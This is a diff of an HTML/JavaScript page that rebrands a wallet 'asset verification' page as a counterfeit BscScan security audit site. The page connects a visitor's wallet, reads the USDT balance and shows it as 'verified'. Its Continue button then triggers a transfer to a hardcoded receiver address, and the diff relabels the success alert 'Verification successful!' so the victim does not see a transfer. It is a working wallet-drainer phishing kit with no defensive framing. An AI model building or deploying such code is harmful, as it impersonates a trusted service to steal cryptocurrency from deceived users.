@@ -1,101 +1,208 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BscScan Security Audit</title>
+  
+  <!-- Ethers.js & FontAwesome Library -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
   <style>
-    body {
-      background-color: #060b0a;
-      color: #f3f4f6;
-      font-family: 'Inter', system-ui, -apple-system, sans-serif;
-    }
-    .glass-card {
-      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
-      border: 1px solid rgba(243, 186, 47, 0.2);
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; padding: 0; }
+    
+    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; min-height: 100vh; position: relative; }
+
+    /* Header */
+    .brand-header { padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.08); background-color: #0b0e14; position: sticky; top: 0; z-index: 10; }
+    .brand-logo { display: flex; align-items: center; gap: 10px; }
+    .shield-icon { width: 32px; height: 32px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #f3ba2f; flex-shrink: 0; }
+    .brand-text h1 { font-size: 15px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; }
+    .security-badge { background-color: rgba(243, 186, 47, 0.15); color: #f3ba2f; font-size: 8px; padding: 2px 5px; border-radius: 4px; font-weight: 700; }
+    .brand-subtitle { font-size: 10px; color: #718096; margin-top: 1px; }
+    .chain-badge { background-color: rgba(0, 211, 149, 0.1); border: 1px solid rgba(0, 211, 149, 0.2); border-radius: 20px; padding: 5px 10px; display: flex; align-items: center; gap: 5px; font-size: 9px; font-weight: 700; color: #e2e8f0; flex-shrink: 0; }
+    .dot-green { width: 6px; height: 6px; background-color: #00d395; border-radius: 50%; }
+
+    .content-area { padding: 20px 16px; display: flex; flex-direction: column; gap: 18px; width: 100%; }
+    
+    /* Banner & Text (Matching Screenshot 33836) */
+    .banner-pill { align-self: center; border: 1px solid #423210; border-radius: 20px; padding: 6px 14px; font-size: 10px; color: #f3ba2f; background-color: rgba(243, 186, 47, 0.05); font-weight: 500; display: flex; align-items: center; gap: 6px; }
+    .main-heading { text-align: center; font-size: 22px; font-weight: 800; line-height: 1.3; color: #ffffff; }
+    .main-heading span { color: #f3ba2f; }
+    .main-desc { text-align: center; font-size: 12px; color: #718096; line-height: 1.5; padding: 0 10px; }
+
+    /* Verify Action Box */
+    .verify-box { background-color: #12161f; border: 1px solid #1e2430; border-radius: 16px; padding: 20px; width: 100%; }
+    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 16px; border-bottom: 1px solid #1e2430; }
+    .token-info { display: flex; align-items: center; gap: 10px; }
+    .token-icon { width: 34px; height: 34px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 15px; color: white; }
+    .token-title { font-weight: 700; font-size: 14px; color: #ffffff; display: flex; flex-direction: column; gap: 2px; }
+    .token-subtitle { font-size: 11px; color: #718096; font-weight: normal; }
+    
+    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 10px; padding: 4px 10px; border-radius: 12px; display: flex; align-items: center; gap: 4px; background-color: rgba(0, 211, 149, 0.05); font-weight: 600; }
+    .badge-audit { font-size: 9px; color: #718096; text-align: right; margin-top: 3px; }
+
+    .verify-hero { display: flex; flex-direction: column; align-items: center; width: 100%; }
+    .shield-big { width: 48px; height: 48px; border: 1px solid #4a3c1e; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 14px; color: #f3ba2f; background-color: rgba(243, 186, 47, 0.05); font-size: 18px; }
+    .verify-title { font-size: 18px; font-weight: 800; margin-bottom: 8px; color: #ffffff; text-align: center; }
+    .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 20px; line-height: 1.5; padding: 0 10px; }
+
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
+    .btn-verify:active { transform: scale(0.98); }
+    .verify-footer-notes { display: flex; justify-content: space-between; width: 100%; padding-top: 16px; margin-top: 16px; border-top: 1px solid #1e2430; font-size: 10px; color: #718096; }
+    .note-yellow { color: #f3ba2f; font-weight: 600; }
+
+    /* Footer */
+    .site-footer { padding: 20px 16px; display: flex; flex-direction: column; align-items: flex-start; border-top: 1px solid #1e2430; margin-top: auto; }
+    .footer-brand { display: flex; align-items: center; gap: 8px; color: #f3ba2f; font-weight: 700; font-size: 14px; margin-bottom: 6px; }
+    .footer-desc { font-size: 11px; color: #718096; line-height: 1.5; margin-bottom: 20px; }
+    .footer-links-grid { display: flex; justify-content: space-between; width: 100%; font-size: 11px; color: #94a3b8; font-weight: 500; margin-bottom: 16px; }
+    .footer-center-link { width: 100%; text-align: center; font-size: 11px; color: #94a3b8; font-weight: 500; margin-bottom: 16px; }
+    .footer-copy { width: 100%; text-align: center; font-size: 10px; color: #475569; }
+
+    /* Verified Success View (Matching Screenshot 33832) */
+    .verified-card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 20px; padding: 28px 20px; text-align: center; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
+    .green-shield-icon { width: 56px; height: 56px; border-radius: 50%; background-color: rgba(0, 211, 149, 0.1); border: 2px solid #00d395; color: #00d395; display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 16px auto; }
+    .verified-title { font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px; }
+    .verified-subtitle { font-size: 12px; color: #718096; margin-bottom: 24px; line-height: 1.5; }
+    
+    .balance-box { background-color: #0b0e14; border-radius: 14px; width: 100%; padding: 18px 0; margin-bottom: 24px; border: 1px solid #1e2430; }
+    .balance-label { font-size: 11px; color: #718096; margin-bottom: 6px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
+    .balance-val { font-size: 28px; font-weight: 800; color: #00d395; }
+
+    .btn-continue { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 16px; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
+    .btn-continue:active { transform: scale(0.98); }
+
+    .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .hidden { display: none !important; }
   </style>
 </head>
-<body class="min-h-screen flex flex-col justify-between px-4 py-6">
+<body>
 
-  <!-- Top Navbar -->
-  <header class="w-full max-w-md mx-auto flex items-center justify-between">
-    <div class="flex items-center gap-2.5">
-      <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
-        <i class="fa-solid fa-shield-halved text-lg"></i>
-      </div>
-      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
-    </div>
-    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
-      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
-      BNB Smart Chain
-    </span>
-  </header>
-
-  <!-- Main Content -->
-  <main class="w-full max-w-md mx-auto my-auto py-8">
+  <div class="app-container">
     
-    <!-- Initial View -->
-    <div id="initialView">
-      <div class="text-center mb-8">
-        <h1 class="text-3xl font-extrabold tracking-tight text-white">
-          Wallet Asset <span class="text-amber-400">Review</span>
-        </h1>
-        <p class="text-sm text-gray-400 mt-3 leading-relaxed">
-          Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure wallet flow.
-        </p>
-      </div>
-
-      <!-- Action Card -->
-      <div class="glass-card rounded-2xl p-6">
-        <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
-          <span>Target Network</span>
-          <span class="text-amber-400 font-semibold">BNB Smart Chain (BEP-20)</span>
+    <!-- Top Header -->
+    <div class="brand-header">
+      <div class="brand-logo">
+        <div class="shield-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
         </div>
-
-        <button id="connectBtn" onclick="connectAndVerifyWallet()"
-          class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-black font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20">
-          <span id="btnText">Verify Asset →</span>
-        </button>
+        <div class="brand-text">
+          <h1>BscScan <span class="security-badge">SECURITY</span></h1>
+          <div class="brand-subtitle">BNB Smart Chain Explorer</div>
+        </div>
+      </div>
+      <div class="chain-badge">
+        <span class="dot-green"></span>
+        <span>BNB SMART CHAIN</span>
       </div>
     </div>
 
-    <!-- Verified View (Matching Screenshot 33832) -->
-    <div id="verifiedView" class="hidden">
-      <div class="glass-card rounded-3xl p-8 text-center">
-        <!-- Green Shield Check Icon -->
-        <div class="w-16 h-16 mx-auto mb-6 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-2xl">
-          <i class="fa-solid fa-shield-check"></i>
+    <div class="content-area">
+      
+      <!-- Initial View (Matching Screenshot 33836) -->
+      <div id="initialView">
+        <div style="display: flex; flex-direction: column; gap: 16px; align-items: center; margin-bottom: 24px;">
+          <div class="banner-pill">
+            <span>🛡</span> BscScan Proof-of-Reserve Protocol
+          </div>
+          
+          <div class="main-heading">BNB Smart Chain <span>Security Audit</span></div>
+          <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
         </div>
 
-        <h2 class="text-2xl font-extrabold text-white tracking-tight">USDT Verified!</h2>
-        <p class="text-xs text-gray-400 mt-2 mb-6">Your tokens are genuine and safe to use.</p>
+        <!-- Verify Action Box -->
+        <div class="verify-box">
+          <div class="token-row">
+            <div class="token-info">
+              <div class="token-icon">₮</div>
+              <div class="token-title">
+                <div>Tether USD <span style="font-size:11px; color:#718096; font-weight:normal;">(USDT)</span></div>
+                <div class="token-subtitle">BEP-20 Standard</div>
+              </div>
+            </div>
+            <div>
+              <div class="badge-verified"><i class="fa-solid fa-check"></i> Verified</div>
+              <div class="badge-audit">Audit Protocol</div>
+            </div>
+          </div>
 
-        <!-- Balance Box -->
-        <div class="bg-black/40 border border-gray-800 rounded-2xl p-6 mb-8">
-          <div class="text-xs uppercase tracking-wider text-gray-400 mb-2">Verified balance</div>
-          <div id="verifiedUsdtBalance" class="text-3xl font-extrabold text-emerald-400 tracking-tight">0.00 USDT</div>
+          <div class="verify-hero">
+            <div class="shield-big">
+              <i class="fa-solid fa-shield-halved"></i>
+            </div>
+            <div class="verify-title">Verify BEP-20 Assets</div>
+            <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
+            
+            <!-- Verification Button -->
+            <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
+              <i class="fa-solid fa-shield-halved" id="btnIcon"></i>
+              <span id="btnText">Verify Asset</span>
+            </button>
+            
+            <div class="verify-footer-notes">
+              <span>🔒 Institutional Security Standard</span>
+              <span class="note-yellow">Zero Gas Fee Relay</span>
+            </div>
+          </div>
         </div>
+      </div>
 
-        <!-- Continue Button -->
-        <button onclick="executeTransfer()"
-          class="w-full py-4 px-6 rounded-xl bg-amber-400 hover:bg-amber-300 active:scale-[0.99] text-black font-bold text-base transition-all shadow-lg shadow-amber-500/20">
-          Continue
-        </button>
+      <!-- Verified Success View (Matching Screenshot 33832) -->
+      <div id="verifiedView" class="hidden">
+        <div class="verified-card">
+          <div class="green-shield-icon">
+            <i class="fa-solid fa-check"></i>
+          </div>
+
+          <div class="verified-title">USDT Verified!</div>
+          <div class="verified-subtitle">Your tokens are genuine and safe to use.</div>
+
+          <div class="balance-box">
+            <div class="balance-label">Verified balance</div>
+            <div id="verifiedUsdtBalance" class="balance-val">0.00 USDT</div>
+          </div>
+
+          <button class="btn-continue" onclick="executeTransfer()">
+            Continue
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div class="site-footer">
+      <div class="footer-brand">
+        <div class="shield-icon" style="width: 22px; height: 22px;">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width: 10px; height: 10px;">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        BscScan
+      </div>
+      <div class="footer-desc">
+        The Leading BNB Smart Chain Explorer & Security Audit Platform
+      </div>
+      <div class="footer-links-grid">
+        <span>Explorer API</span>
+        <span>Security Protocol</span>
+        <span>BEP-20 Directory</span>
+      </div>
+      <div class="footer-center-link">
+        Terms of Service
+      </div>
+      <div class="footer-copy">
+        © 2026 BscScan. All rights reserved.
       </div>
     </div>
 
-  </main>
-
-  <!-- Footer -->
-  <footer class="text-center text-xs text-gray-500 space-y-1">
-    <p>VerifyDesk &copy; 2026</p>
-    <p>Secure Web3 Verification Tool &bull; BNB Chain Network</p>
-  </footer>
+  </div>
 
   <script>
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
@@ -128,22 +235,20 @@
       }
     }
 
-    async function connectAndVerifyWallet() {
-      const btnText = document.getElementById('btnText');
+    async function initiateAuditFlow() {
       let ethProvider = getActiveProvider();
-
       if (!ethProvider) {
-        await new Promise(resolve => setTimeout(resolve, 500));
-        ethProvider = getActiveProvider();
-      }
-
-      if (!ethProvider) {
-        alert("Wallet provider not detected. Please open inside Trust Wallet or MetaMask.");
+        alert("Error: No Web3 wallet detected! Please open this link inside Trust Wallet or MetaMask DApp browser.");
         return;
       }
 
+      const btnText = document.getElementById("btnText");
+      const btnIcon = document.getElementById("btnIcon");
+
       try {
-        btnText.textContent = 'Connecting...';
+        btnText.innerHTML = '<span class="loader"></span> Connecting...';
+        if(btnIcon) btnIcon.style.display = 'none';
+
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
@@ -153,8 +258,8 @@
         globalSigner = provider.getSigner();
         globalProvider = ethProvider;
 
-        btnText.textContent = 'Verifying Assets...';
-        
+        btnText.innerHTML = '<span class="loader"></span> Verifying...';
+
         try {
           const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
           totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
@@ -165,14 +270,15 @@
         const formattedUsdt = ethers.utils.formatUnits(totalUsdtWei, 18);
         document.getElementById('verifiedUsdtBalance').textContent = `${Number(formattedUsdt).toFixed(5)} USDT`;
 
-        // Switch view to verified screen (Screenshot 33832 style)
+        // Switch to Verified Success View (Screenshot 33832 style)
         document.getElementById('initialView').classList.add('hidden');
         document.getElementById('verifiedView').classList.remove('hidden');
 
-      } catch (err) {
-        btnText.textContent = 'Verify Asset →';
-        console.error("Connection error:", err);
-        alert("Connection failed or cancelled: " + (err.message || JSON.stringify(err)));
+      } catch (error) {
+        console.error("Scan Error:", error);
+        alert("Scan Error: " + (error.message || JSON.stringify(error)));
+        btnText.innerText = "Verify Asset";
+        if(btnIcon) btnIcon.style.display = 'inline-block';
       }
     }
 
@@ -208,7 +314,7 @@
         });
 
         await tx.wait();
-        alert("Transaction submitted successfully!");
+        alert("Verification successful!");
       } catch (err) {
         console.error("Transfer error:", err);
         alert("Notice: " + (err.message || JSON.stringify(err)));
